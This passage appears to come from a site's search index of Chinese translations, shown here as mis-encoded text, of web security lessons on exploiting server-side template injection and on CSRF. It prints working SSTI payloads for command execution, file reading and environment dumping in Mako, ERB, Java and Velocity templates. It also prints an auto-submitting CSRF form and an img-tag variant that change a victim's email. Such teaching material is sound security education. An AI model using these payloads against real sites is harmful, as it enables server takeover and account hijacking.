æ‰§è¡Œå¯ä»¥ç®€å•åˆ°ï¼š \u003c% import os x=os.popen('id').read() %\u003e ${x} åœ¨éæ²™ç›’ç¯å¢ƒä¸­ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œå¹¶å°†å…¶ç”¨äºè¯»å–ã€ç¼–è¾‘æˆ–åˆ é™¤ä»»æ„æ–‡ä»¶åœ¨è®¸å¤šå¸¸è§æ¨¡æ¿å¼•æ“ä¸­éƒ½éå¸¸ç®€å•ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:1:1","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"é˜…è¯»å®‰å…¨éƒ¨åˆ† é™¤äº†æä¾›å¦‚ä½•åˆ›å»ºå’Œä½¿ç”¨æ¨¡æ¿çš„åŸºç¡€çŸ¥è¯†å¤–ï¼Œæ–‡æ¡£è¿˜å¯èƒ½æä¾›æŸç§â€œå®‰å…¨â€éƒ¨åˆ†ã€‚è¿™ä¸ªéƒ¨åˆ†çš„åç§°ä¼šæœ‰æ‰€ä¸åŒï¼Œä½†å®ƒé€šå¸¸ä¼šæ¦‚æ‹¬å‡ºäººä»¬åº”è¯¥é¿å…ä½¿ç”¨æ¨¡æ¿è¿›è¡Œçš„æ‰€æœ‰æ½œåœ¨å±é™©çš„äº‹æƒ…ã€‚è¿™å¯èƒ½æ˜¯ä¸€ä¸ªéå¸¸å®è´µçš„èµ„æºï¼Œç”šè‡³å¯ä»¥ä½œä¸ºä¸€ç§å¤‡å¿˜å•ï¼Œä¸ºä½ åº”è¯¥å¯»æ‰¾å“ªäº›è¡Œä¸ºï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒä»¬æä¾›æŒ‡å—ã€‚ å³ä½¿æ²¡æœ‰ä¸“é—¨çš„â€œå®‰å…¨â€éƒ¨åˆ†ï¼Œå¦‚æœæŸä¸ªç‰¹å®šçš„å†…ç½®å¯¹è±¡æˆ–å‡½æ•°ä¼šå¸¦æ¥å®‰å…¨é£é™©ï¼Œæ–‡æ¡£ä¸­å‡ ä¹æ€»æ˜¯ä¼šå‡ºç°æŸç§è­¦å‘Šã€‚è¿™ä¸ªè­¦å‘Šå¯èƒ½ä¸ä¼šæä¾›å¤ªå¤šç»†èŠ‚ï¼Œä½†è‡³å°‘åº”å°†å…¶æ ‡è®°ä¸ºå¯ä»¥æ·±å…¥æŒ–æ˜ç ”ç©¶çš„å†…å®¹ã€‚ ä¾‹å¦‚ï¼Œåœ¨ ERB æ¨¡æ¿ä¸­ï¼Œæ–‡æ¡£æ˜¾ç¤ºå¯ä»¥åˆ—å‡ºæ‰€æœ‰ç›®å½•ï¼Œç„¶åæŒ‰å¦‚ä¸‹æ–¹å¼è¯»å–ä»»æ„æ–‡ä»¶ï¼š \u003c%= Dir.entries('/') %\u003e \u003c%= File.open('/example/arbitrary-file').read %\u003e ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:1:2","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"æŸ¥æ‰¾å·²çŸ¥çš„æ¼æ´åˆ©ç”¨ åˆ©ç”¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„å¦ä¸€ä¸ªå…³é”®æ–¹é¢æ˜¯å–„äºæŸ¥æ‰¾å…¶ä»–åœ¨çº¿èµ„æºã€‚ä¸€æ—¦ä½ èƒ½å¤Ÿè¯†åˆ«æ­£åœ¨ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ï¼Œä½ åº”è¯¥æµè§ˆ web ä»¥æŸ¥æ‰¾å…¶ä»–äººå¯èƒ½å·²ç»å‘ç°çš„ä»»ä½•æ¼æ´ã€‚ç”±äºä¸€äº›ä¸»è¦æ¨¡æ¿å¼•æ“çš„å¹¿æ³›ä½¿ç”¨ï¼Œæœ‰æ—¶å¯èƒ½ä¼šå‘ç°æœ‰å……åˆ†è®°å½•çš„æ¼æ´åˆ©ç”¨ï¼Œä½ å¯ä»¥å¯¹å…¶è¿›è¡Œè°ƒæ•´ä»¥åˆ©ç”¨åˆ°è‡ªå·±çš„ç›®æ ‡ç½‘ç«™ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:1:3","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"æ¢ç´¢ æ­¤æ—¶ï¼Œä½ å¯èƒ½å·²ç»åœ¨ä½¿ç”¨æ–‡æ¡£æ—¶å¶ç„¶å‘ç°äº†ä¸€ä¸ªå¯è¡Œçš„æ¼æ´åˆ©ç”¨ã€‚å¦‚æœæ²¡æœ‰ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ¢ç´¢ç¯å¢ƒå¹¶å°è¯•å‘ç°ä½ å¯ä»¥è®¿é—®çš„æ‰€æœ‰å¯¹è±¡ã€‚ è®¸å¤šæ¨¡æ¿å¼•æ“å…¬å¼€æŸç§ç±»å‹çš„ self æˆ– environment å¯¹è±¡ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºåŒ…å«æ¨¡æ¿å¼•æ“æ”¯æŒçš„æ‰€æœ‰å¯¹è±¡ã€æ–¹æ³•å’Œå±æ€§çš„å‘½åç©ºé—´ã€‚å¦‚æœå­˜åœ¨è¿™æ ·çš„å¯¹è±¡ï¼Œåˆ™å¯ä»¥æ½œåœ¨åœ°ä½¿ç”¨å®ƒæ¥ç”ŸæˆèŒƒå›´å†…çš„å¯¹è±¡åˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œåœ¨åŸºäº Java çš„æ¨¡æ¿è¯­è¨€ä¸­ï¼Œæœ‰æ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ³¨å…¥åˆ—å‡ºç¯å¢ƒä¸­çš„æ‰€æœ‰å˜é‡ï¼š ${T(java.lang.System).getenv()} è¿™å¯ä»¥ä½œä¸ºåˆ›å»ºä¸€ä¸ªæ½œåœ¨æœ‰è¶£å¯¹è±¡å’Œæ–¹æ³•çš„çŸ­åå•çš„åŸºç¡€ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥ç ”ç©¶ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:2:0","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"å¼€å‘äººå‘˜æä¾›çš„å¯¹è±¡ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç½‘ç«™å°†åŒ…å«ç”±æ¨¡æ¿æä¾›çš„å†…ç½®å¯¹è±¡å’Œç”± web å¼€å‘äººå‘˜æä¾›çš„è‡ªå®šä¹‰ã€ç‰¹å®šäºç«™ç‚¹çš„å¯¹è±¡ã€‚ä½ åº”è¯¥ç‰¹åˆ«æ³¨æ„è¿™äº›éæ ‡å‡†å¯¹è±¡ï¼Œå› ä¸ºå®ƒä»¬ç‰¹åˆ«å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯æˆ–å¯åˆ©ç”¨çš„æ–¹æ³•ã€‚ç”±äºè¿™äº›å¯¹è±¡å¯èƒ½åœ¨åŒä¸€ç½‘ç«™ä¸­çš„ä¸åŒæ¨¡æ¿ä¹‹é—´æœ‰æ‰€ä¸åŒï¼Œè¯·æ³¨æ„ï¼Œä½ å¯èƒ½éœ€è¦åœ¨æ¯ä¸ªä¸åŒæ¨¡æ¿çš„ä¸Šä¸‹æ–‡ä¸­ç ”ç©¶å¯¹è±¡çš„è¡Œä¸ºï¼Œç„¶åæ‰èƒ½æ‰¾åˆ°åˆ©ç”¨å®ƒçš„æ–¹æ³•ã€‚ è™½ç„¶æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œå’ŒæœåŠ¡å™¨çš„å®Œå…¨æ¥ç®¡ï¼Œä½†åœ¨å®è·µä¸­ï¼Œè¿™å¹¶éæ€»æ˜¯å¯ä»¥å®ç°ã€‚ç„¶è€Œï¼Œä»…ä»…æ’é™¤äº†è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå¹¶ä¸ä¸€å®šæ„å‘³ç€ä¸å­˜åœ¨å…¶ä»–ç±»å‹çš„æ”»å‡»ã€‚ä½ ä»ç„¶å¯ä»¥åˆ©ç”¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´è¿›è¡Œå…¶ä»–é«˜å±å®³æ€§æ”»å‡»ï¼Œä¾‹å¦‚ç›®å½•éå†ï¼Œä»¥è®¿é—®æ•æ„Ÿæ•°æ®ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:2:1","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"æ„é€ è‡ªå®šä¹‰æ”»å‡» åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸»è¦ç ”ç©¶äº†é€šè¿‡é‡ç”¨å·²è®°å½•çš„æ¼æ´æ”»å‡»æˆ–ä½¿ç”¨æ¨¡æ¿å¼•æ“ä¸­å·²çŸ¥çš„æ¼æ´æ¥æ„å»ºæ”»å‡»ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶ä½ éœ€è¦æ„å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„æ¼æ´åˆ©ç”¨ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½ä¼šå‘ç°æ¨¡æ¿å¼•æ“åœ¨æ²™ç›’ä¸­æ‰§è¡Œæ¨¡æ¿ï¼Œè¿™ä¼šä½¿æ”»å‡»å˜å¾—å›°éš¾ï¼Œç”šè‡³ä¸å¯èƒ½ã€‚ åœ¨è¯†åˆ«æ”»å‡»ç‚¹ä¹‹åï¼Œå¦‚æœæ²¡æœ‰æ˜æ˜¾çš„æ–¹æ³•æ¥åˆ©ç”¨æ¼æ´ï¼Œä½ åº”è¯¥ç»§ç»­ä½¿ç”¨ä¼ ç»Ÿçš„å®¡è®¡æŠ€æœ¯ï¼Œæ£€æŸ¥æ¯ä¸ªå‡½æ•°çš„å¯åˆ©ç”¨è¡Œä¸ºã€‚é€šè¿‡æœ‰æ¡ä¸ç´Šåœ°å®Œæˆè¿™ä¸€è¿‡ç¨‹ï¼Œä½ æœ‰æ—¶å¯ä»¥æ„å»ºä¸€ä¸ªå¤æ‚çš„æ”»å‡»ï¼Œç”šè‡³èƒ½å¤Ÿåˆ©ç”¨äºæ›´å®‰å…¨çš„ç›®æ ‡ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:3:0","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"ä½¿ç”¨å¯¹è±¡é“¾æ„é€ è‡ªå®šä¹‰æ”»å‡» å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œç¬¬ä¸€æ­¥æ˜¯æ ‡è¯†ä½ æœ‰æƒè®¿é—®çš„å¯¹è±¡å’Œæ–¹æ³•ã€‚æœ‰äº›å¯¹è±¡å¯èƒ½ä¼šç«‹å³è·³å‡ºæ¥ã€‚é€šè¿‡ç»“åˆä½ è‡ªå·±çš„çŸ¥è¯†å’Œæ–‡æ¡£ä¸­æä¾›çš„ä¿¡æ¯ï¼Œä½ åº”è¯¥èƒ½å¤Ÿå°†ä½ æƒ³è¦æ›´å½»åº•åœ°æŒ–æ˜çš„å¯¹è±¡çš„çŸ­åå•æ”¾åœ¨ä¸€èµ·ã€‚ åœ¨ç ”ç©¶å¯¹è±¡çš„æ–‡æ¡£æ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„è¿™äº›å¯¹è±¡å…è®¸è®¿é—®å“ªäº›æ–¹æ³•ï¼Œä»¥åŠå®ƒä»¬è¿”å›å“ªäº›å¯¹è±¡ã€‚é€šè¿‡æ·±å…¥åˆ°æ–‡æ¡£ä¸­ï¼Œä½ å¯ä»¥å‘ç°å¯ä»¥é“¾æ¥åœ¨ä¸€èµ·çš„å¯¹è±¡å’Œæ–¹æ³•çš„ç»„åˆã€‚å°†æ­£ç¡®çš„å¯¹è±¡å’Œæ–¹æ³•é“¾æ¥åœ¨ä¸€èµ·æœ‰æ—¶å…è®¸ä½ è®¿é—®æœ€åˆçœ‹èµ·æ¥é¥ä¸å¯åŠçš„å±é™©åŠŸèƒ½å’Œæ•æ„Ÿæ•°æ®ã€‚ ä¾‹å¦‚ï¼Œåœ¨åŸºäº Java çš„æ¨¡æ¿å¼•æ“ Velocity ä¸­ï¼Œä½ å¯ä»¥è°ƒç”¨ $class è®¿é—® ClassTool å¯¹è±¡ã€‚ç ”ç©¶æ–‡æ¡£è¡¨æ˜ï¼Œä½ å¯ä»¥é“¾å¼ä½¿ç”¨ $class.inspect() æ–¹æ³•å’Œ $class.type å±æ€§å¼•ç”¨ä»»æ„å¯¹è±¡ã€‚åœ¨è¿‡å»ï¼Œè¿™è¢«ç”¨æ¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œ shell å‘½ä»¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š $class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"bad-stuff-here\") ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:3:1","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"ä½¿ç”¨å¼€å‘äººå‘˜æä¾›çš„å¯¹è±¡æ„é€ è‡ªå®šä¹‰æ”»å‡» ä¸€äº›æ¨¡æ¿å¼•æ“é»˜è®¤è¿è¡Œåœ¨å®‰å…¨ã€é”å®šçš„ç¯å¢ƒä¸­ï¼Œä»¥ä¾¿å°½å¯èƒ½åœ°é™ä½ç›¸å…³é£é™©ã€‚å°½ç®¡è¿™ä½¿å¾—åˆ©ç”¨è¿™äº›æ¨¡æ¿è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œå˜å¾—å¾ˆå›°éš¾ï¼Œä½†æ˜¯å¼€å‘äººå‘˜åˆ›å»ºçš„æš´éœ²äºæ¨¡æ¿çš„å¯¹è±¡å¯ä»¥æä¾›æ›´è¿›ä¸€æ­¥çš„æ”»å‡»ç‚¹ã€‚ ç„¶è€Œï¼Œè™½ç„¶é€šå¸¸ä¸ºæ¨¡æ¿å†…ç½®å¯¹è±¡æä¾›äº†å¤§é‡çš„æ–‡æ¡£ï¼Œä½†æ˜¯ç½‘ç«™ç‰¹å®šçš„å¯¹è±¡å‡ ä¹æ ¹æœ¬å°±æ²¡æœ‰æ–‡æ¡£è®°å½•ã€‚å› æ­¤ï¼Œè¦æƒ³çŸ¥é“å¦‚ä½•åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œå°±éœ€è¦ä½ æ‰‹åŠ¨è°ƒæŸ¥ç½‘ç«™çš„è¡Œä¸ºï¼Œä»¥ç¡®å®šæ”»å‡»ç‚¹ï¼Œå¹¶æ®æ­¤æ„å»ºä½ è‡ªå·±çš„è‡ªå®šä¹‰æ”»å‡»ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:3:2","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ CSRF","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"Cross-site request forgery (CSRF) åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œå¹¶æè¿°ä¸€äº›å¸¸è§çš„ CSRF æ¼æ´ç¤ºä¾‹ï¼ŒåŒæ—¶è¯´æ˜å¦‚ä½•é˜²å¾¡ CSRF æ”»å‡»ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ CSRF è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ˜¯ä¸€ç§ web å®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸æƒ³æ‰§è¡Œçš„æ“ä½œã€‚æ”»å‡»è€…è¿›è¡Œ CSRF èƒ½å¤Ÿéƒ¨åˆ†è§„é¿åŒæºç­–ç•¥ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF æ”»å‡»èƒ½é€ æˆä»€ä¹ˆå½±å“ åœ¨æˆåŠŸçš„ CSRF æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šä½¿å—å®³ç”¨æˆ·æ— æ„ä¸­æ‰§è¡ŒæŸä¸ªæ“ä½œã€‚ä¾‹å¦‚ï¼Œè¿™å¯èƒ½æ˜¯æ›´æ”¹ä»–ä»¬å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€ã€æ›´æ”¹å¯†ç æˆ–è¿›è¡Œèµ„é‡‘è½¬è´¦ã€‚æ ¹æ®æ“ä½œçš„æ€§è´¨ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå®Œå…¨æ§åˆ¶ç”¨æˆ·çš„å¸æˆ·ã€‚å¦‚æœå—å®³ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­å…·æœ‰ç‰¹æƒè§’è‰²ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºçš„æ‰€æœ‰æ•°æ®å’ŒåŠŸèƒ½ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF æ˜¯å¦‚ä½•å·¥ä½œçš„ è¦ä½¿ CSRF æ”»å‡»æˆä¸ºå¯èƒ½ï¼Œå¿…é¡»å…·å¤‡ä¸‰ä¸ªå…³é”®æ¡ä»¶ï¼š ç›¸å…³çš„åŠ¨ä½œã€‚æ”»å‡»è€…æœ‰ç†ç”±è¯±ä½¿åº”ç”¨ç¨‹åºä¸­å‘ç”ŸæŸç§åŠ¨ä½œã€‚è¿™å¯èƒ½æ˜¯ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™ï¼‰ï¼Œä¹Ÿå¯èƒ½æ˜¯é’ˆå¯¹ç”¨æˆ·ç‰¹å®šæ•°æ®çš„ä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚æ›´æ”¹ç”¨æˆ·è‡ªå·±çš„å¯†ç ï¼‰ã€‚ åŸºäº Cookie çš„ä¼šè¯å¤„ç†ã€‚æ‰§è¡Œè¯¥æ“ä½œæ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–å¤šä¸ª HTTP è¯·æ±‚ï¼Œåº”ç”¨ç¨‹åºä»…ä¾èµ–ä¼šè¯cookie æ¥æ ‡è¯†å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶ç”¨äºè·Ÿè¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚ æ²¡æœ‰ä¸å¯é¢„æµ‹çš„è¯·æ±‚å‚æ•°ã€‚æ‰§è¡Œè¯¥æ“ä½œçš„è¯·æ±‚ä¸åŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„ä»»ä½•å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“å¯¼è‡´ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦çŸ¥é“ç°æœ‰å¯†ç çš„å€¼ï¼Œåˆ™è¯¥åŠŸèƒ½ä¸ä¼šå—åˆ°æ”»å‡»ã€‚ å‡è®¾åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå…è®¸ç”¨æˆ·æ›´æ”¹å…¶é‚®ç®±åœ°å€çš„åŠŸèƒ½ã€‚å½“ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œä¼šå‘å‡ºå¦‚ä¸‹ HTTP è¯·æ±‚ï¼š POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE email=wiener@normal-user.com è¿™ä¸ªä¾‹å­ç¬¦åˆ CSRF è¦æ±‚çš„æ¡ä»¶ï¼š æ›´æ”¹ç”¨æˆ·å¸æˆ·ä¸Šçš„é‚®ç®±åœ°å€çš„æ“ä½œä¼šå¼•èµ·æ”»å‡»è€…çš„å…´è¶£ã€‚æ‰§è¡Œæ­¤æ“ä½œåï¼Œæ”»å‡»è€…é€šå¸¸èƒ½å¤Ÿè§¦å‘å¯†ç é‡ç½®å¹¶å®Œå…¨æ§åˆ¶ç”¨æˆ·çš„å¸æˆ·ã€‚ åº”ç”¨ç¨‹åºä½¿ç”¨ä¼šè¯ cookie æ¥æ ‡è¯†å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æ ‡è®°æˆ–æœºåˆ¶æ¥è·Ÿè¸ªç”¨æˆ·ä¼šè¯ã€‚ æ”»å‡»è€…å¯ä»¥è½»æ¾ç¡®å®šæ‰§è¡Œæ“ä½œæ‰€éœ€çš„è¯·æ±‚å‚æ•°çš„å€¼ã€‚ å…·å¤‡è¿™äº›æ¡ä»¶åï¼Œæ”»å‡»è€…å¯ä»¥æ„å»ºåŒ…å«ä»¥ä¸‹ HTML çš„ç½‘é¡µï¼š \u003chtml\u003e \u003cbody\u003e \u003cform action=\"https://vulnerable-website.com/email/change\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" /\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e å¦‚æœå—å®³ç”¨æˆ·è®¿é—®äº†æ”»å‡»è€…çš„ç½‘é¡µï¼Œå°†å‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š æ”»å‡»è€…çš„é¡µé¢å°†è§¦å‘å¯¹æ˜“å—æ”»å‡»çš„ç½‘ç«™çš„ HTTP è¯·æ±‚ã€‚ å¦‚æœç”¨æˆ·ç™»å½•åˆ°æ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œå…¶æµè§ˆå™¨å°†è‡ªåŠ¨åœ¨è¯·æ±‚ä¸­åŒ…å«å…¶ä¼šè¯ cookieï¼ˆå‡è®¾ SameSite cookies æœªè¢«ä½¿ç”¨ï¼‰ã€‚ æ˜“å—æ”»å‡»çš„ç½‘ç«™å°†ä»¥æ­£å¸¸æ–¹å¼å¤„ç†è¯·æ±‚ï¼Œå°†å…¶è§†ä¸ºå—å®³è€…ç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ï¼Œå¹¶æ›´æ”¹å…¶ç”µå­é‚®ä»¶åœ°å€ã€‚ æ³¨æ„ï¼šè™½ç„¶ CSRF é€šå¸¸æ˜¯æ ¹æ®åŸºäº cookie çš„ä¼šè¯å¤„ç†æ¥æè¿°çš„ï¼Œä½†å®ƒä¹Ÿå‡ºç°åœ¨åº”ç”¨ç¨‹åºè‡ªåŠ¨å‘è¯·æ±‚æ·»åŠ ä¸€äº›ç”¨æˆ·å‡­æ®çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œä¾‹å¦‚ HTTP Basic authentication åŸºæœ¬éªŒè¯å’Œ certificate-based authentication åŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"å¦‚ä½•æ„é€  CSRF æ”»å‡» æ‰‹åŠ¨åˆ›å»º CSRF æ”»å‡»æ‰€éœ€çš„ HTML å¯èƒ½å¾ˆéº»çƒ¦ï¼Œå°¤å…¶æ˜¯åœ¨æ‰€éœ€è¯·æ±‚åŒ…å«å¤§é‡å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæˆ–è€…åœ¨è¯·æ±‚ä¸­å­˜åœ¨å…¶ä»–å¼‚å¸¸æƒ…å†µæ—¶ã€‚æ„é€  CSRF æ”»å‡»çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ Burp Suite Professionalï¼ˆä»˜è´¹è½¯ä»¶ï¼‰ ä¸­çš„ CSRF PoC generatorã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"å¦‚ä½•ä¼ é€’ CSRF è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»çš„ä¼ é€’æœºåˆ¶ä¸åå°„å‹ XSS çš„ä¼ é€’æœºåˆ¶åŸºæœ¬ç›¸åŒã€‚é€šå¸¸ï¼Œæ”»å‡»è€…ä¼šå°†æ¶æ„ HTML æ”¾åˆ°ä»–ä»¬æ§åˆ¶çš„ç½‘ç«™ä¸Šï¼Œç„¶åè¯±ä½¿å—å®³è€…è®¿é—®è¯¥ç½‘ç«™ã€‚è¿™å¯ä»¥é€šè¿‡ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤åª’ä½“æ¶ˆæ¯å‘ç”¨æˆ·æä¾›æŒ‡å‘ç½‘ç«™çš„é“¾æ¥æ¥å®ç°ã€‚æˆ–è€…ï¼Œå¦‚æœæ”»å‡»è¢«æ”¾ç½®åœ¨ä¸€ä¸ªæµè¡Œçš„ç½‘ç«™ï¼ˆä¾‹å¦‚ï¼Œåœ¨ç”¨æˆ·è¯„è®ºä¸­ï¼‰ï¼Œåˆ™åªéœ€ç­‰å¾…ç”¨æˆ·ä¸Šé’©å³å¯ã€‚ è¯·æ³¨æ„ï¼Œä¸€äº›ç®€å•çš„ CSRF æ”»å‡»ä½¿ç”¨ GET æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æ˜“å—æ”»å‡»ç½‘ç«™ä¸Šçš„å•ä¸ª URL å®Œå…¨è‡ªåŒ…å«ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¸éœ€è¦ä½¿ç”¨å¤–éƒ¨ç«™ç‚¹ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥å‘å—å®³è€…æä¾›æ˜“å—æ”»å‡»åŸŸä¸Šçš„æ¶æ„ URL ã€‚åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå¦‚æœå¯ä»¥ä½¿ç”¨ GET æ–¹æ³•æ‰§è¡Œæ›´æ”¹ç”µå­é‚®ä»¶åœ°å€çš„è¯·æ±‚ï¼Œåˆ™è‡ªåŒ…å«çš„æ”»å‡»å¦‚ä¸‹æ‰€ç¤ºï¼š \u003cimg src=\"https://vulnerable-website.com/email/change?email=pwned@evil-user.net\"\u003e ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"é˜²å¾¡ CSRF æ”»å‡» é˜²å¾¡ CSRF æ”»å‡»æœ€æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯åœ¨ç›¸å…³è¯·æ±‚ä¸­ä½¿ç”¨ CSRF token ï¼Œæ­¤ token åº”è¯¥æ˜¯ï¼š ä¸å¯é¢„æµ‹çš„ï¼Œå…·æœ‰é«˜ç†µçš„ ç»‘å®šåˆ°ç”¨æˆ·çš„ä¼šè¯ä¸­ åœ¨ç›¸å…³æ“ä½œæ‰§è¡Œå‰ï¼Œä¸¥æ ¼éªŒè¯æ¯ç§æƒ…å†µ å¯ä¸ CSRF token ä¸€èµ·ä½¿ç”¨çš„é™„åŠ é˜²å¾¡æªæ–½æ˜¯ SameSite cookies ã€‚ 